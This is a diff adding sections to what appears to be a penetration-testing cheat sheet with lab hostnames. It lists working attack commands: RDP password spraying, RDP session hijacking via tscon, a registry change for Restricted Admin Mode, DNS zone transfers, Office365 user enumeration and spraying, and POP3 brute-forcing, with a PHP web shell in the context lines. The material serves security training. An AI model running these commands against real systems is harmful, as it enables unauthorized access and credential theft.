@@ -893,6 +893,52 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshe
 select LOAD_FILE("/etc/passwd");
 
 ```
+##### Attacking RDP Services
+```
+# Password spraying against the RDP service using crowbar
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+
+# Connect to the RDP service using rdesktop in Linux.
+rdesktop -u admin -p password123 192.168.2.143
+
+# List user logged in and this session in machine
+query user
+
+# 	Impersonate a user without its password and Execute the RDP session hijack. ( need priv SYSTEM)
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+net start sessionhijack
+
+# Enable "Restricted Admin Mode" on the target Windows host.
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+##### Attacking DNS Services
+```
+# DIG - AXFR Zone Transfer
+dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
+or
+dig axfr windcorp.thm @192.168.150.100
+
+# DIG - Reverse DNS Lookup
+dig -x 10.129.227.180 @192.168.150.100
+
+# DIG - DNS Record Enumeration (ANY)
+dig windcorp.thm @192.168.150.100 ANY
+
+# Enumerate the CNAME records for those subdomains
+host support.inlanefreight.com
+
+# Tools like Fierce can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer (https://github.com/mschwager/fierce) 
+fierce --domain zonetransfer.me
+
+# Subdomain Enumeration by subfinder  (https://github.com/projectdiscovery/subfinder)
+./subfinder -d inlanefreight.com -v
+
+# Subdomain Enumeration by Subbrute  (https://github.com/TheRook/subbrute)
+git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
+cd subbrute
+echo "ns1.inlanefreight.com" > ./resolvers.txt
+./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt 
+```
 ##### Attacking Email Services
 ```
 # DNS lookup for mail servers for the specified domain
@@ -909,6 +955,15 @@ telnet 10.10.110.20 25
 
 # SMTP user enumeration using the RCPT command against the specified host
 smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+
+# Verify the usage of Office365 for the specified domain. (https://github.com/0xZDH/o365spray)
+python3 o365spray.py --validate --domain msplaintext.xyz
+
+# Enumerate existing users using Office365 on the specified domain.
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+
+# python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+Password spraying against a list of users that use Office365 for the specified domain.
 
 # Brute-forcing the POP3 service.
 hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
